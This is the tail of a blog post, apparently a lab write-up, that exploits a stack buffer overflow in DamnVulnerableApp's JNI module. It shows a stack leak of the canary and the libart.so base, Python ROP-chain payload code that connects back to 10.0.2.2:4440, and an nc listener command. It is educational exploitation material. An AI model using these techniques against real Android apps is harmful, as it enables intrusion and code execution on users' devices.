</span></span></code></pre></div><p>This is due to the fact that <code>stringLength</code> is computed w.r.t. the length of the input buffer <code>string</code>, but not w.r.t. the length of the destination buffer <code>buffer</code>. Thus, if <code>length > 0x20</code>, a classical buffer overflow occurs. Notice that the user has complete control over the contents and length of <code>string</code>, which is actually of type <code>jbyteArray</code>.</p><h3 id=memory-leaks>Memory Leak(s)</h3><p>In addition to the ability of manipulating the whole stack located above <code>buffer</code>, there is a weird sequence of code leading to returning more than &ldquo;intended&rdquo;. Namely:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=kt>int</span><span class=p>)</span><span class=n>length</span> <span class=o>&lt;</span> <span class=mh>0x101</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>bufferLength</span> <span class=o>=</span> <span class=nf>perfect_strlen</span><span class=p>(</span><span class=n>buffer</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=n>bufferLength</span> <span class=o>=</span> <span class=nf>perfect_strlen</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>array</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>NewByteArray</span><span class=p>)(</span><span class=n>env</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>bufferLength</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>SetByteArrayRegion</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>array</span><span class=p>,</span><span class=mi>0</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>bufferLength</span><span class=p>,</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>fs</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>)</span> <span class=o>==</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>array</span><span class=p>;</span>
</span></span></code></pre></div><p>So if <code>length &lt;= 0x100</code>, then it will be added to <code>bufferLength</code>. Technically, setting <code>length &lt; 0</code> or <code>length &lt; -perfect_strlen(buffer)</code> is possible, but does not seem very useful at first glance. Then, <code>bufferLength</code> bytes are copied from <code>buffer</code> into <code>array</code>. As <code>strlen(buffer) + length > 0x20 = sizeof (buffer)</code> is possible, this might leak arbitrary values from the stack coming after the buffer.</p><p>Summing up, if we sent a payload of the form</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>client</span><span class=o>.</span><span class=n>forward</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x42</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>client</span><span class=o>.</span><span class=n>forward</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00\x01\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=c1># big - endian</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>client</span><span class=o>.</span><span class=n>fetch</span><span class=p>()</span>
</span></span></code></pre></div><p>we would get an additional <code>0x100</code> bytes from the memory located above <code>buffer</code>, i.e. from the stack. This leaks, among other things</p><ol><li>Return address to <code>art_quick_generic_jni_trampoline</code>, which leaks the base of <code>libart.so</code> (almost as awesome as <code>libc.so</code>&mldr;as regards gadgets)</li><li>Old <code>rbp</code>, i.e. a stack pointer</li></ol><h2 id=exploitation->Exploitation >:)</h2><p>Lets assume we already have a leaked <code>libart.so</code> pointer, i.e. we ran:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>client</span><span class=o>.</span><span class=n>forward</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x42</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>client</span><span class=o>.</span><span class=n>forward</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00\x01\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>client</span><span class=o>.</span><span class=n>fetch</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>decompose</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=mh>0x20</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>leak</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># libart.so address of art_quick_generic_jni_trampoline+220,</span>
</span></span><span class=line><span class=cl><span class=c1># i.e. at file offset 0x39ffac (may differ)</span>
</span></span><span class=line><span class=cl><span class=n>libart_base</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span> <span class=o>-</span> <span class=mh>0x39ffac</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decompose</span><span class=p>(</span><span class=n>leak</span> <span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span> <span class=n>leak</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>8</span><span class=p>:(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>8</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span> <span class=o>//</span> <span class=mi>8</span><span class=p>)</span> <span class=p>]</span>
</span></span></code></pre></div><p>To figure out that the second qword is the canary, just iterate over the decomposed leak and look for <em>not - address - looking</em> values. I always encountered fully random canaries, i.e. 8 random bytes, which seem to be the <a href=https://link.springer.com/article/10.1007/s10207-018-00425-8 target=_blank rel=noopener>default on Android</a>
. But this will only be relevant in case e.g. <code>strcpy</code> is used instead of e.g. <code>memcpy</code>.</p><p>Using your favourite tool for gadget extraction, like <a href=https://github.com/sashs/Ropper target=_blank rel=noopener><em>ropper</em></a>
or <a href=https://github.com/JonathanSalwan/ROPgadget target=_blank rel=noopener><em>ROPgadget</em></a>
, you can construct a ROP - chain to get arbitrary code execution. Basically, your payload could look like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x42</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x20</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>leak</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=c1># &lt;-- unknown address</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>canary</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>leak</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=c1># &lt;-- probably old rbp</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_1</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_2</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>enjoy</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></div><p>because the leaked data from the stack looked like this (from low to high addresses):</p><pre tabindex=0><code>lower   0x72d1b9cdc210      &lt;-- unknown address
  |     0x79291c4ee3e94be3  &lt;-- that is the canary
  |     0x72d08b1c28b0      &lt;-- probably old rbp
higher  0x72d0f87a032c      &lt;-- this is your most favourite address to leak
</code></pre><p>Notice that we do not need to care about the <em>unknown</em> address, because we are almost done.</p><p>Lets briefly think about how to approach the holy grail, i.e. <em>arbitrary code execution</em>. At first glance, a few options come to mind (consider the fact that e.g. <code>libart.so</code> is compiled with <em>RELRO</em> etc.):</p><ol><li>ROP - chain that contains <strong>all</strong> the &ldquo;code&rdquo; (via gadgets) to execute. This (almost irreversibly) destroys the stack and you cannot expect that the app will recover from that.</li><li>smaller ROP - chain that writes some qwords into global memory (e.g. <code>.data@libart.so</code> or <code>.bss@libart.so</code>) and then restores the stack.</li><li>smaller ROP - chain that allocates writable and executable memory via e.g. <code>mmap</code>, writes the pointer returned in <code>rax</code> into global memory (thus only 8 bytes of global memory are invalidated). Then proceed as in 2. just with the new memory to write shellcode. Finally return into the shellcode.</li><li><a href=https://en.wikipedia.org/wiki/Sigreturn-oriented_programming target=_blank rel=noopener>sigrop</a>
, but there is no reason to use this.</li></ol><p>For this blog post, we will only consider the first option, i.e. destroying the stack (don&rsquo;t worry the other ones will be covered in later posts ;D).</p><p>The naming convention for gadgets is like this: <code>gadget_opcode_operand1_operand2_opcode_operand1...</code>. So you need to be able to identify opcodes on Intel (the emulator runs on x86_64) to understand the ROP - chain. The following is an example of a ROP - chain connecting to <code>10.0.2.2:4440</code>, where <code>10.0.2.2</code> is <a href=https://developer.android.com/studio/run/emulator-networking.html target=_blank rel=noopener>an alias to your loopback interface</a>
:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Setup payload</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x20</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>leak</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=c1># &lt;-- unknown address</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>canary</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>leak</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=c1># &lt;-- probably old rbp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Dynamically compute libc address via toupper@.got in libStackBufferOverflowModule.so</span>
</span></span><span class=line><span class=cl><span class=c1># and store it into writable_memory</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>compute_libc_base</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>writable_memory</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>call_libc_function</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>writable_memory</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;socket&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=mh>0x2</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Store socket in memory</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rdi</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>writable_memory</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_mov_deref_rdi_rax</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Construct sockaddr_in</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rdi</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>writable_memory</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rax</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x02\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x11\x58</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x0a\x00\x02\x02</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_mov_deref_rdi_rax</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rdi</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>writable_memory</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rax</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x8</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_mov_deref_rdi_rax</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Connect to 10.0.2.2:4440</span>
</span></span><span class=line><span class=cl><span class=c1># rdx = size</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rdx</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x10</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x7</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># rsi = addr of socketaddr_in</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rsi</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>writable_memory</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># rdi = sockfd</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rdi</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>writable_memory</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_mov_rax_deref_rdi</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_mov_rdi_rax_pop_rax</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>writable_memory</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Call function --&gt; syscall instead of libc call, because this returns errno</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rax</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x2a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_syscall</span>
</span></span></code></pre></div><p>Lets take a step back and see the individual steps the ROP - chain performs:</p><ol><li><code>compute_libc_base</code> computes the base address of <code>libc.so</code> by &ldquo;leaking&rdquo; a <code>libc.so</code> address from <code>.got@libStackBufferOverflowModule.so</code> into a register and writing that address into <code>writable_memory</code></li><li><code>call_libc_function</code> calls <code>socket@libc.so</code> and puts the file descriptor into <code>writable_memory+0x8</code></li><li>Then a structure of type <code>struct sockaddr_in</code> is crafted in global memory and describes where to connect to.</li><li>Finally <code>connect@syscall</code> is called. At least on my end, calling <code>connect@libc.so</code> caused an error. This might be due to the fact that we wrote into global memory located in <code>libart.so</code> (&mldr; whyever that would be the case though). For this PoC, we just need the app to perform a connection. Therefore we can use a system call to do so. We did <strong>not</strong> use a system call to create the socket, as there where no gadgets of the form <code>syscall; ret</code> (or <em>ropper</em> did not tell me). Thus, after the <code>syscall</code> gadget, the behaviour of the app is undefined.</li></ol><p>To catch the PoC, run the following command on your local machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>4440</span>
</span></span></code></pre></div><p>Now one might argue: &ldquo;Why don&rsquo;t we just run a classical <code>execve</code> ROP - chain?&rdquo;.</p><p>The answer to that lies in the implementation of <em>DamnVulnerableApp</em>. The manager app will <em>clean up</em> the vulnerable process, if the connection between them breaks. Observe that calling <code>execve</code> will definitely destroy the connection between the vulnerable app and the manager app. This forces the manager app to send a <code>SIGKILL</code> to the vulnerable app, thus ending its life even before the program to be executed via <code>execve</code> is initialized. As <code>execve</code> does not create a new process (and creating a new process might even violate the permissions of the vulnerable app), i.e. the PID stays the same, the manager app will always shutdown <code>execve</code> attempts. Also one could argue that it is better practice to keep the target app alive for stealth - reasons.</p><h1 id=conclusion>Conclusion</h1><p>In summary, the <em>EasyStackBufferOverflowModule</em> can be exploited by using a classical ROP - chain after leaking enough information. It is possible to get <em>arbitrary code execution</em> limited only by the constraints that <em>DamnVulnerableApp</em> (and its permissions and security mechanisms) imposes.</p></article></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
</i>2022 - 2025 lolcads</div><div class="flex flex-row"><span class="ml-0 pl-0 md:ml-2 md:pl-2 border-l-0 md:border-l border-slate-300 dark:border-slate-400">Powered by <a href=https://gohugo.io target=_blank rel=noopener class=underline>Hugo</a> <span class=text-red-600>&#9829;</span> <a href=https://github.com/tomowang/hugo-theme-tailwind target=_blank rel=noopener class=underline>Tailwind</a></span></div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>